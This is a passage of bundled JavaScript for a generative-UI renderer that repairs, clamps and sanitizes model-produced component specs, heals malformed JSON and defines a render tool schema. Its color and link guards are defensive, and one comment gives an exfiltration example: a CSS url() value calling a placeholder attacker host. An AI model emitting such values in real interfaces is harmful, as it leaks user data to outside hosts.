import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
//#region src/client/spec.ts
/**
* Wrap a bare component object into a col root. Returns null when `value` is
* not component-shaped (no usable `type`). `panel`/`append` live on the root
* spec, so they are hoisted onto the wrapper.
*/
function wrapSingleComponentRoot(value) {
	if (typeof value !== "object" || value === null) return null;
	const v = value;
	if (typeof v.type !== "string" || v.type === "") return null;
	const root = {
		type: "col",
		items: [value]
	};
	if (v.panel === true) root.panel = true;
	if (v.append === true) root.append = true;
	return root;
}
//#endregion
//#region src/client/guard.ts
/** Hard resource limits enforced by repair (and mirrored at render time). */
const GENUI_LIMITS = {
	/** Maximum nesting depth of the component tree. */
	maxDepth: 8,
	/** Maximum total nodes across the whole spec. */
	maxNodes: 200,
	/** Maximum length of any plain string field. */
	maxString: 2e3,
	/** Maximum length of a `code` body. */
	maxCode: 12e3,
	/** Maximum length of a mermaid source. */
	maxMermaid: 8e3,
	/** Maximum `grid` columns. */
	maxGridCols: 12,
	/** Maximum `tabs` count. */
	maxTabs: 12,
	/** Maximum `accordion` items. */
	maxAccordionItems: 24,
	/** Maximum `list` items. */
	maxListItems: 50,
	/** Maximum `select`/`radio` options. */
	maxOptions: 50,
	/** Maximum `table` rows / columns. */
	maxTableRows: 50,
	maxTableCols: 12,
	/** Maximum `chart` data points per series. */
	maxChartPoints: 60,
	/** Maximum `plot` series and per-series parameters. */
	maxPlotSeries: 8,
	maxPlotParams: 6,
	/** Maximum `scene3d` meshes. */
	maxMeshes: 5,
	/** Maximum `quiz` options. */
	maxQuizOptions: 8,
	/** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
	maxSteps: 24,
	maxTimelineItems: 24,
	maxBreadcrumbItems: 12,
	maxKeyValuePairs: 24,
	/** Maximum `file-tree` nesting. */
	maxTreeDepth: 6
};
/** Is `v` one of `values`? (enum guard) */
function inEnum(v, values) {
	return typeof v === "string" && values.includes(v);
}
/** String field: truncate a string to `cap`, or undefined when not a string. */
function str(v, cap) {
	return typeof v === "string" ? v.slice(0, cap) : void 0;
}
/**
* Color field: the value lands in an inline `style` (background/stroke) or
* THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
* (or a hostile spec) could emit `url(https://attacker/track?...)` and the
* browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
* functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
* to the component's default palette.
*/
const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/;
function color(v) {
	if (typeof v !== "string") return void 0;
	const s = v.trim();
	return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : void 0;
}
/**
* Link target field: only http(s) and mailto survive. `javascript:`/`data:`
* and every other scheme degrade to a plain-text node — the model's link is
* display, not an execution channel.
*/
function safeHref(v) {
	if (typeof v !== "string") return void 0;
	const s = v.trim();
	if (s.length > 2048) return void 0;
	return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : void 0;
}
/** Finite-number field: clamp into [min, max], or undefined when not finite. */
function num(v, min, max) {
	return typeof v === "number" && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : void 0;
}
/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
function int(v, min, max) {
	return typeof v === "number" && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : void 0;
}
/** Optional enum field: the value when it matches, otherwise undefined. */
function enu(v, values) {
	return inEnum(v, values) ? v : void 0;
}
/** Plain object (not array, not null). */
function obj(v) {
	return typeof v === "object" && v !== null && !Array.isArray(v) ? v : void 0;
}
/**
* Optional-field spread helper. `exactOptionalPropertyTypes` forbids
* `{ gap: number | undefined }`; computing the value into a const first and
* spreading `opt('gap', g)` keeps every optional field either absent or a
* plain value.
*/
function opt(key, value) {
	return value === void 0 ? {} : { [key]: value };
}
const TEXT_SIZES = [
	"h1",
	"h2",
	"h3",
	"body",
	"muted",
	"caption"
];
const BUTTON_TONES = [
	"primary",
	"danger",
	"success",
	"ghost"
];
const BADGE_TONES = [
	"success",
	"warn",
	"danger",
	"accent"
];
const INPUT_TYPES = [
	"text",
	"email",
	"password"
];
const CALLOUT_TONES = [
	"info",
	"success",
	"warning",
	"error"
];
const CHART_KINDS = [
	"bars",
	"line",
	"donut"
];
const PLOT_KINDS = [
	"line",
	"area",
	"scatter"
];
const MESH_SHAPES = [
	"box",
	"sphere",
	"cone",
	"cylinder",
	"torus"
];
const FILE_TYPES = ["file", "dir"];
/** Walk `list` with the shared node budget; drops invalid entries. */
function repairItems(list, ctx, depth) {
	if (!Array.isArray(list)) return [];
	const out = [];
	for (const item of list) {
		if (ctx.remaining <= 0) break;
		ctx.remaining -= 1;
		const node = repairNode(item, ctx, depth);
		if (node !== null) out.push(node);
	}
	return out;
}
function repairNode(value, ctx, depth) {
	if (depth > GENUI_LIMITS.maxDepth) return null;
	const v = obj(value);
	if (v === void 0) return null;
	const type = v.type;
	if (typeof type !== "string") return null;
	switch (type) {
		case "text": {
			const content = str(v.content, GENUI_LIMITS.maxString);
			if (content === void 0) return null;
			return {
				type: "text",
				content,
				...opt("size", enu(v.size, TEXT_SIZES)),
				...opt("center", v.center === true ? true : void 0)
			};
		}
		case "row": return {
			type: "row",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("wrap", v.wrap === true ? true : void 0),
			...opt("spacer", v.spacer === true ? true : void 0)
		};
		case "col": return {
			type: "col",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("gap", num(v.gap, 0, 96))
		};
		case "grid": return {
			type: "grid",
			cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1,
			items: repairItems(v.items, ctx, depth + 1)
		};
		case "card": return {
			type: "card",
			items: repairItems(v.items, ctx, depth + 1),
			...opt("title", str(v.title, GENUI_LIMITS.maxString))
		};
		case "button": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "button",
				label,
				...opt("tone", enu(v.tone, BUTTON_TONES)),
				...opt("full", v.full === true ? true : void 0),
				...opt("small", v.small === true ? true : void 0),
				...opt("icon", str(v.icon, 64)),
				...opt("action", str(v.action, 200))
			};
		}
		case "input": return {
			type: "input",
			...opt("label", str(v.label, GENUI_LIMITS.maxString)),
			...opt("placeholder", str(v.placeholder, GENUI_LIMITS.maxString)),
			...opt("value", str(v.value, GENUI_LIMITS.maxString)),
			...opt("inputType", enu(v.inputType, INPUT_TYPES)),
			...opt("action", str(v.action, 200)),
			...opt("id", str(v.id, 200))
		};
		case "select": {
			const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString);
			if (options === void 0) return null;
			return {
				type: "select",
				options,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("action", str(v.action, 200)),
				...opt("selected", int(v.selected, 0, options.length - 1)),
				...opt("id", str(v.id, 200))
			};
		}
		case "checkbox": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "checkbox",
				label,
				...opt("checked", v.checked === true ? true : void 0),
				...opt("action", str(v.action, 200))
			};
		}
		case "link": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "link",
				label,
				...opt("href", safeHref(v.href))
			};
		}
		case "badge": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "badge",
				label,
				...opt("tone", enu(v.tone, BADGE_TONES)),
				...opt("icon", str(v.icon, 64))
			};
		}
		case "stat": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			const value = str(v.value, 128);
			if (label === void 0 || value === void 0) return null;
			return {
				type: "stat",
				label,
				value,
				...opt("delta", str(v.delta, 64))
			};
		}
		case "progress": {
			const value = num(v.value, 0, 100);
			if (value === void 0) return null;
			return {
				type: "progress",
				value,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("valueLabel", str(v.valueLabel, 64))
			};
		}
		case "divider": return { type: "divider" };
		case "spacer": return { type: "spacer" };
		case "avatar": {
			const name = str(v.name, 64);
			if (name === void 0) return null;
			return {
				type: "avatar",
				name,
				...opt("color", color(v.color))
			};
		}
		case "list": {
			const items = repairListItems(v.items, GENUI_LIMITS.maxListItems);
			if (items === void 0) return null;
			return {
				type: "list",
				items
			};
		}
		case "table": {
			const columns = repairStrings(v.columns, GENUI_LIMITS.maxTableCols, 128);
			const rows = repairRows(v.rows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols);
			if (columns === void 0 || rows === void 0) return null;
			return {
				type: "table",
				columns,
				rows
			};
		}
		case "chart": {
			const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints);
			const series = Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : void 0;
			if (data === void 0 && series === void 0) return null;
			return {
				type: "chart",
				data: data ?? [],
				...opt("kind", enu(v.kind, CHART_KINDS)),
				...opt("series", series)
			};
		}
		case "tabs": {
			const tabs = repairTabs(v.tabs, ctx, depth);
			if (tabs === void 0) return null;
			return {
				type: "tabs",
				tabs
			};
		}
		case "plot": {
			const series = repairPlotSeries(v.series, GENUI_LIMITS.maxPlotSeries);
			if (series === void 0) return null;
			return {
				type: "plot",
				series,
				...opt("xMin", num(v.xMin, -1e6, 1e6)),
				...opt("xMax", num(v.xMax, -1e6, 1e6)),
				...opt("yMin", num(v.yMin, -1e9, 1e9)),
				...opt("yMax", num(v.yMax, -1e9, 1e9)),
				...opt("title", str(v.title, GENUI_LIMITS.maxString))
			};
		}
		case "callout": {
			const content = str(v.content, GENUI_LIMITS.maxString);
			if (content === void 0) return null;
			return {
				type: "callout",
				content,
				...opt("tone", enu(v.tone, CALLOUT_TONES)),
				...opt("title", str(v.title, GENUI_LIMITS.maxString))
			};
		}
		case "steps": {
			const steps = repairSteps(v.steps);
			if (steps === void 0) return null;
			return {
				type: "steps",
				steps,
				...opt("current", int(v.current, 0, steps.length))
			};
		}
		case "keyvalue": {
			const pairs = repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs);
			if (pairs === void 0) return null;
			return {
				type: "keyvalue",
				pairs
			};
		}
		case "diff": {
			const diffs = repairDiffs(v.diffs);
			if (diffs === void 0) return null;
			return {
				type: "diff",
				diffs
			};
		}
		case "json":
			if (!("value" in v)) return null;
			return {
				type: "json",
				value: v.value
			};
		case "code": {
			const code = str(v.code, GENUI_LIMITS.maxCode);
			if (code === void 0) return null;
			return {
				type: "code",
				code,
				...opt("lang", str(v.lang, 64))
			};
		}
		case "radio": {
			const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString);
			if (options === void 0) return null;
			return {
				type: "radio",
				options,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("selected", int(v.selected, 0, options.length - 1)),
				...opt("action", str(v.action, 200)),
				...opt("group", str(v.group, 200)),
				...opt("answer", typeof v.answer === "number" && Number.isFinite(v.answer) && v.answer >= 0 && v.answer < options.length ? Math.trunc(v.answer) : typeof v.answer === "string" ? v.answer.slice(0, 512) : void 0),
				...opt("explanation", str(v.explanation, GENUI_LIMITS.maxString))
			};
		}
		case "submit": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			const action = str(v.action, 200);
			if (label === void 0) return null;
			return {
				type: "submit",
				label,
				...opt("action", action),
				...opt("resetAction", str(v.resetAction, 200)),
				...opt("groups", repairStrings(v.groups, GENUI_LIMITS.maxOptions, 200))
			};
		}
		case "switch": {
			const label = str(v.label, GENUI_LIMITS.maxString);
			if (label === void 0) return null;
			return {
				type: "switch",
				label,
				...opt("checked", v.checked === true ? true : void 0),
				...opt("action", str(v.action, 200))
			};
		}
		case "slider": {
			const min = num(v.min, -1e9, 1e9) ?? 0;
			const max = num(v.max, -1e9, 1e9) ?? 100;
			const lo = Math.min(min, max);
			const hi = Math.max(min, max);
			const step = num(v.step, 1e-9, Math.max(hi - lo, 1e-9));
			const value = num(v.value, lo, hi) ?? lo;
			return {
				type: "slider",
				min: lo,
				max: hi,
				...opt("step", step),
				value,
				...opt("label", str(v.label, GENUI_LIMITS.maxString)),
				...opt("action", str(v.action, 200)),
				...opt("id", str(v.id, 200))
			};
		}
		case "textarea": return {
			type: "textarea",
			...opt("label", str(v.label, GENUI_LIMITS.maxString)),
			...opt("placeholder", str(v.placeholder, GENUI_LIMITS.maxString)),
			...opt("rows", int(v.rows, 1, 30)),
			...opt("value", str(v.value, GENUI_LIMITS.maxString)),
			...opt("action", str(v.action, 200)),
			...opt("id", str(v.id, 200))
		};
		case "accordion": {
			const items = repairAccordion(v.items, ctx, depth);
			if (items === void 0) return null;
			return {
				type: "accordion",
				items
			};
		}
		case "copy": {
			const text = str(v.text, GENUI_LIMITS.maxCode);
			if (text === void 0) return null;
			return {
				type: "copy",
				text,
				...opt("label", str(v.label, 128))
			};
		}
		case "mermaid": {
			const code = str(v.code, GENUI_LIMITS.maxMermaid);
			if (code === void 0) return null;
			return {
				type: "mermaid",
				code
			};
		}
		case "scene3d": {
			const meshes = repairMeshes(v.meshes);
			if (meshes === void 0) return null;
			return {
				type: "scene3d",
				meshes,
				...opt("title", str(v.title, GENUI_LIMITS.maxString)),
				...opt("ambient", num(v.ambient, 0, 2)),
				...opt("background", color(v.background))
			};
		}
		case "timeline": {
			const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems);
			if (items === void 0) return null;
			return {
				type: "timeline",
				items
			};
		}
		case "file-tree": {
			const items = repairTree(v.items, GENUI_LIMITS.maxListItems);
			if (items === void 0) return null;
			return {
				type: "file-tree",
				items
			};
		}
		case "breadcrumb": {
			const items = repairStrings(v.items, GENUI_LIMITS.maxBreadcrumbItems, GENUI_LIMITS.maxString);
			if (items === void 0) return null;
			return {
				type: "breadcrumb",
				items
			};
		}
		case "quiz": {
			const question = str(v.question, GENUI_LIMITS.maxString);
			const options = repairQuizOptions(v.options);
			if (question === void 0 || options === void 0) return null;
			return {
				type: "quiz",
				question,
				options,
				...opt("explanation", str(v.explanation, GENUI_LIMITS.maxString)),
				...opt("id", str(v.id, 200)),
				...opt("action", str(v.action, 200))
			};
		}
		default: return value;
	}
}
function repairStrings(v, cap, strCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		if (typeof item === "string") out.push(item.slice(0, strCap));
	}
	return out;
}
function repairListItems(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		if (typeof item === "string") {
			out.push(item.slice(0, GENUI_LIMITS.maxString));
			continue;
		}
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, GENUI_LIMITS.maxString);
		if (title === void 0) continue;
		out.push({
			title,
			...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString))
		});
	}
	return out;
}
function repairRows(v, rowCap, colCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const row of v) {
		if (out.length >= rowCap) break;
		if (!Array.isArray(row)) continue;
		const cells = [];
		for (const cell of row) {
			if (cells.length >= colCap) break;
			if (typeof cell === "string") cells.push(cell.slice(0, 256));
			else if (typeof cell === "number" && Number.isFinite(cell)) cells.push(cell);
		}
		if (cells.length > 0) out.push(cells);
	}
	return out;
}
function repairChartData(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const datum of v) {
		if (out.length >= cap) break;
		const o = obj(datum);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		const value = o === void 0 ? void 0 : num(o.value, -0xe8d4a51000, 0xe8d4a51000);
		if (label === void 0 || value === void 0) continue;
		out.push({
			label,
			value,
			...opt("color", o === void 0 ? void 0 : color(o.color))
		});
	}
	return out;
}
function repairSeries(v, cap, pointCap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= cap) break;
		const o = obj(s);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		const data = o === void 0 ? void 0 : repairChartData(o.data, pointCap);
		if (label === void 0 || data === void 0) continue;
		out.push({
			label,
			data,
			...opt("color", o === void 0 ? void 0 : color(o.color))
		});
	}
	return out;
}
function repairTabs(v, ctx, depth) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const tab of v) {
		if (out.length >= GENUI_LIMITS.maxTabs) break;
		const o = obj(tab);
		const label = o === void 0 ? void 0 : str(o.label, 128);
		if (label === void 0 || o === void 0) continue;
		out.push({
			label,
			items: repairItems(o.items, ctx, depth + 1)
		});
	}
	return out;
}
function repairPlotSeries(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= cap) break;
		const o = obj(s);
		const expr = o === void 0 ? void 0 : str(o.expr, 512);
		if (expr === void 0 || o === void 0) continue;
		const params = [];
		if (Array.isArray(o.params)) for (const p of o.params) {
			if (params.length >= GENUI_LIMITS.maxPlotParams) break;
			const po = obj(p);
			const name = po === void 0 ? void 0 : str(po.name, 64);
			const value = po === void 0 ? void 0 : num(po.value, -1e9, 1e9);
			if (name === void 0 || value === void 0) continue;
			params.push({
				name,
				value,
				...opt("min", po === void 0 ? void 0 : num(po.min, -1e9, 1e9)),
				...opt("max", po === void 0 ? void 0 : num(po.max, -1e9, 1e9)),
				...opt("step", po === void 0 ? void 0 : num(po.step, 1e-9, 1e9)),
				...opt("animateTo", po === void 0 ? void 0 : num(po.animateTo, -1e9, 1e9)),
				...opt("durationMs", po === void 0 ? void 0 : num(po.durationMs, 1, 12e4)),
				...opt("loop", po === void 0 ? void 0 : po.loop === true ? true : void 0)
			});
		}
		out.push({
			expr,
			...opt("label", str(o.label, 128)),
			...opt("color", color(o.color)),
			...opt("kind", enu(o.kind, PLOT_KINDS)),
			...opt("params", params.length > 0 ? params : void 0)
		});
	}
	return out;
}
function repairSteps(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const s of v) {
		if (out.length >= GENUI_LIMITS.maxSteps) break;
		const o = obj(s);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0) continue;
		out.push({
			title,
			...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString))
		});
	}
	return out;
}
function repairPairs(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const p of v) {
		if (out.length >= cap) break;
		const o = obj(p);
		const key = o === void 0 ? void 0 : str(o.key, 256);
		const value = o === void 0 ? void 0 : str(o.value, GENUI_LIMITS.maxString);
		if (key === void 0 || value === void 0) continue;
		out.push({
			key,
			value
		});
	}
	return out;
}
function repairDiffs(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const d of v) {
		if (out.length >= 24) break;
		const o = obj(d);
		const path = o === void 0 ? void 0 : str(o.path, 1024);
		const newText = o === void 0 ? void 0 : str(o.newText, 2e4);
		if (path === void 0 || newText === void 0) continue;
		const old = o === void 0 ? void 0 : o.oldText;
		out.push({
			path,
			newText,
			oldText: old === null || typeof old !== "string" ? null : old.slice(0, 2e4)
		});
	}
	return out;
}
function repairAccordion(v, ctx, depth) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= GENUI_LIMITS.maxAccordionItems) break;
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0 || o === void 0) continue;
		out.push({
			title,
			items: repairItems(o.items, ctx, depth + 1)
		});
	}
	return out;
}
function repairMeshes(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const m of v) {
		if (out.length >= GENUI_LIMITS.maxMeshes) break;
		const o = obj(m);
		const shape = o === void 0 ? void 0 : enu(o.shape, MESH_SHAPES);
		if (shape === void 0) continue;
		const scale = o === void 0 ? void 0 : num(o.scale, -1e6, 1e6) ?? tuple3(o.scale);
		const size = o === void 0 ? void 0 : num(o.size, -1e6, 1e6) ?? tuple3(o.size);
		out.push({
			shape,
			...opt("color", o === void 0 ? void 0 : color(o.color)),
			...opt("position", o === void 0 ? void 0 : tuple3(o.position)),
			...opt("rotation", o === void 0 ? void 0 : tuple3(o.rotation)),
			...opt("scale", scale),
			...opt("size", size)
		});
	}
	return out;
}
function tuple3(v) {
	if (!Array.isArray(v) || v.length !== 3) return void 0;
	const [a, b, c] = v;
	if (typeof a !== "number" || !Number.isFinite(a) || typeof b !== "number" || !Number.isFinite(b) || typeof c !== "number" || !Number.isFinite(c)) return void 0;
	return [
		Math.min(1e6, Math.max(-1e6, a)),
		Math.min(1e6, Math.max(-1e6, b)),
		Math.min(1e6, Math.max(-1e6, c))
	];
}
function repairTimeline(v, cap) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		const o = obj(item);
		const title = o === void 0 ? void 0 : str(o.title, 256);
		if (title === void 0) continue;
		out.push({
			title,
			...opt("desc", o === void 0 ? void 0 : str(o.desc, GENUI_LIMITS.maxString)),
			...opt("time", o === void 0 ? void 0 : str(o.time, 128))
		});
	}
	return out;
}
function repairTree(v, cap) {
	return walkTree(v, cap, GENUI_LIMITS.maxTreeDepth);
}
function walkTree(v, cap, depthLeft) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const item of v) {
		if (out.length >= cap) break;
		const o = obj(item);
		const name = o === void 0 ? void 0 : str(o.name, 256);
		if (name === void 0) continue;
		const children = o !== void 0 && depthLeft > 0 && Array.isArray(o.children) ? walkTree(o.children, cap, depthLeft - 1) : void 0;
		out.push({
			name,
			...opt("type", o === void 0 ? void 0 : enu(o.type, FILE_TYPES)),
			...opt("children", children)
		});
	}
	return out;
}
function repairQuizOptions(v) {
	if (!Array.isArray(v)) return void 0;
	const out = [];
	for (const optItem of v) {
		if (out.length >= GENUI_LIMITS.maxQuizOptions) break;
		const o = obj(optItem);
		const label = o === void 0 ? void 0 : str(o.label, 512);
		if (label === void 0) continue;
		out.push({
			label,
			...opt("correct", o === void 0 ? void 0 : o.correct === true ? true : void 0),
			...opt("feedback", o === void 0 ? void 0 : str(o.feedback, GENUI_LIMITS.maxString))
		});
	}
	return out;
}
/**
* Deterministically repair a raw spec value into a renderable GenuiSpec.
* Returns null only when the root is not an object with an `items` array
* (a bare component root is wrapped into a col first — the documented fence
* vocabulary allows single-component bodies); every other defect is healed by
* dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
* no-op.
*/
function repairGenuiSpec(value) {
	const v = obj(value);
	if (v === void 0) return null;
	if (!Array.isArray(v.items)) {
		const wrapped = wrapSingleComponentRoot(value);
		if (wrapped === null) return null;
		return repairGenuiSpec(wrapped);
	}
	const ctx = { remaining: GENUI_LIMITS.maxNodes };
	return {
		...opt("title", str(v.title, GENUI_LIMITS.maxString)),
		...opt("gap", num(v.gap, 0, 96)),
		...opt("panel", v.panel === true ? true : void 0),
		...opt("append", v.append === true ? true : void 0),
		items: repairItems(v.items, ctx, 0)
	};
}
/**
* Count the nodes of a spec tree (every item, descending into tabs /
* accordion / file-tree containers — the same descent `validateGenuiSpec`
* walks). Shared by the panel fold (node-budget gate) and validation, so
* the panel never runs a second, divergent traversal. `cap` bounds the walk
* for hostile inputs; the panel passes `PANEL_LIMITS.maxNodes + 1` to detect
* overflow without counting the whole tree.
*/
function countGenuiNodes(value, cap = Number.POSITIVE_INFINITY) {
	let count = 0;
	const walk = (list) => {
		if (!Array.isArray(list)) return;
		for (const item of list) {
			if (count >= cap) return;
			count += 1;
			const v = obj(item);
			if (v === void 0) continue;
			if (v.type === "tabs" && Array.isArray(v.tabs)) for (const t of v.tabs) {
				if (count >= cap) return;
				const to = obj(t);
				if (to !== void 0) walk(to.items);
			}
			else if (v.type === "accordion" && Array.isArray(v.items)) for (const it of v.items) {
				if (count >= cap) return;
				const io = obj(it);
				if (io !== void 0) walk(io.items);
			}
			else if (v.type === "file-tree" && Array.isArray(v.items)) walk(v.items);
		}
	};
	const root = obj(value);
	walk(root === void 0 ? [] : root.items);
	return count;
}
//#endregion
//#region src/shared/fence-repair.ts
/**
* Tier-2 repair — SETTLED MESSAGES ONLY (never while streaming): heals
* structural incompleteness — missing closing quotes/brackets — by appending
* the missing terminators, and heals stray closers — a `]` mistyped as `}` or
* a duplicated terminator — by skipping closers that do not match the open
* stack (they cannot be legal JSON). Callers gate it on settled messages (the
* client uses the host-provided fence source; the validate tool is by
* definition pre-emission), so a streaming half can never flash premature UI.
*
* ONE unified scan: the tier-1 fixes (quote escaping + trailing-comma drops)
* are folded into the same pass, so bodies that combine BOTH defect classes
* (a trailing comma AND a missing closer) heal in one shot — the old
* two-phase chain lost tier-1's partial work when its whole-body parse
* failed, and re-scanning the raw text could not compose the repairs.
* Adopted only when the completed body parses as whole JSON.
*/
function completeFenceJson(raw) {
	try {
		JSON.parse(raw);
		return null;
	} catch {}
	let out = "";
	const stack = [];
	let inString = false;
	let escaped = false;
	let repairs = 0;
	for (let i = 0; i < raw.length; i++) {
		const ch = raw[i];
		if (escaped) {
			out += ch;
			escaped = false;
			continue;
		}
		if (inString) {
			if (ch === "\\") {
				out += ch;
				escaped = true;
				continue;
			}
			if (ch !== "\"") {
				out += ch;
				continue;
			}
			let j = i + 1;
			while (j < raw.length && (raw[j] === " " || raw[j] === "	" || raw[j] === "\n" || raw[j] === "\r")) j++;
			const next = j < raw.length ? raw[j] : "";
			if (next === "," || next === "]" || next === "}" || next === ":" || next === "") {
				inString = false;
				out += ch;
			} else {
				out += "\\\"";
				repairs++;
			}
			continue;
		}
		if (ch === "\"") {
			inString = true;
			out += ch;
			continue;
		}
		if (ch === "{") {
			stack.push("}");
			out += ch;
			continue;
		}
		if (ch === "[") {
			stack.push("]");
			out += ch;
			continue;
		}
		if (ch === "}" || ch === "]") {
			if (stack[stack.length - 1] === ch) {
				stack.pop();
				out += ch;
			} else repairs++;
			continue;
		}
		if (ch === ",") {
			let j = i + 1;
			while (j < raw.length && (raw[j] === " " || raw[j] === "	" || raw[j] === "\n" || raw[j] === "\r")) j++;
			const next = j < raw.length ? raw[j] : "";
			if (next === "}" || next === "]" || next === "") {
				repairs++;
				continue;
			}
		}
		out += ch;
	}
	if (inString) {
		out += "\"";
		repairs++;
	}
	while (stack.length > 0) {
		out += stack.pop();
		repairs++;
	}
	if (repairs === 0) return null;
	try {
		JSON.parse(out);
		return {
			text: out,
			repairs
		};
	} catch {
		return null;
	}
}
//#endregion
//#region src/plugin/tool.ts
/**
* Arguments schema: an open `spec` slot. The schema must NOT reject anything
* the guard could repair — the model's component trees are imperfect by
* nature, and the guard heals them; argument validation would only strand
* them. `additionalProperties: false` keeps the call shape honest.
*
* `spec` IS typed `object` on purpose: the guard can only repair plain
* records (a serialized JSON string, array, or scalar root is unusable), so
* argument validation rejecting non-objects loses nothing repairable — and
* it stops the model from double-encoding the tree as a string (observed
* twice in the wild), failing fast with a clear schema error instead.
*/
const RENDER_UI_PARAMETERS = {
	type: "object",
	properties: { spec: {
		type: "object",
		description: "GenUI component tree (white-listed vocabulary, see the dsh-ui fence section in the system prompt). Deep-validated and repaired by the renderer. Pass the spec as a JSON OBJECT — never as a serialized JSON string (a string fails argument validation).",
		properties: {
			title: {
				type: "string",
				description: "Short title shown as the card banner."
			},
			gap: {
				type: "number",
				description: "Vertical gap between root items in px."
			},
			panel: {
				type: "boolean",
				description: "Panel-only: renders into the session panel dock instead of the message flow."
			},
			items: {
				type: "array",
				description: "Root component list (white-listed vocabulary).",
				items: { type: "object" }
			}
		}
	} },
	required: ["spec"],
	additionalProperties: false
};
/** The tool's canonical value is a short model-facing summary string. */
const RENDER_UI_OUTPUT_SCHEMA = {
	type: "string",
	description: "One-line human-readable render summary for the model."
};
/**
* Read the `spec` argument defensively (presenters run on replayed args).
*
* The harness tool-call bridge has been observed to deliver arguments in
* shapes other than the authored `{ spec: <object> }`:
* - `{ spec: "<JSON string>" }` — spec serialized to text;
* - `{ arguments: "<JSON string>" }` / `{ arguments: <object> }` — a
*   double-encoded wrapper from the SDK tool-call bridge (seen live in the
*   web GUI: small specs arrived wrapped this way, large specs arrived with
*   their JSON corrupted mid-stream);
* - a bare JSON string (double-encoded root).
* Each shape is unwrapped here so the guard can repair the actual tree.
* Corrupted JSON cannot be recovered (bytes were lost in transit): it yields
* `undefined` plus a diagnostic log line for the transport-layer bug.
*/
function specOf(args) {
	if (typeof args === "string") return parseSpecJson(args, "bare-string");
	if (typeof args !== "object" || args === null) return void 0;
	const record = args;
	if ("spec" in record) {
		const s = record.spec;
		if (typeof s === "string") return parseSpecJson(s, "spec-string");
		return unwrapSpec(s, "spec");
	}
	if ("arguments" in record) {
		const a = record.arguments;
		if (typeof a === "string") return parseSpecJson(a, "arguments-string");
		if (typeof a === "object" && a !== null) return unwrapSpec(a, "arguments");
	}
}
/**
* Peel nested `{ spec: ... }` wrapper layers. Observed bridge shapes nest the
* authored `spec` object one or more levels deep (e.g. the serialized text
* inside `{ arguments: "..." }` is itself `{ spec: { title, gap, items } }`),
* so unwrapping stops only at a value that carries no `spec` key.
*/
function unwrapSpec(value, shape) {
	if (typeof value === "object" && value !== null) {
		const record = value;
		if ("spec" in record) {
			const s = record.spec;
			if (typeof s === "string") return parseSpecJson(s, `${shape}/spec-string`);
			return unwrapSpec(s, `${shape}/spec`);
		}
	}
	return value;
}
/** Try to decode a serialized spec; log a diagnostic when it is broken. */
function parseSpecJson(raw, shape) {
	try {
		return unwrapSpec(JSON.parse(raw), shape);
	} catch (error) {
		const detail = error instanceof Error ? error.message : String(error);
		const pos = /position (\d+)/.exec(detail)?.[1] ?? "?";
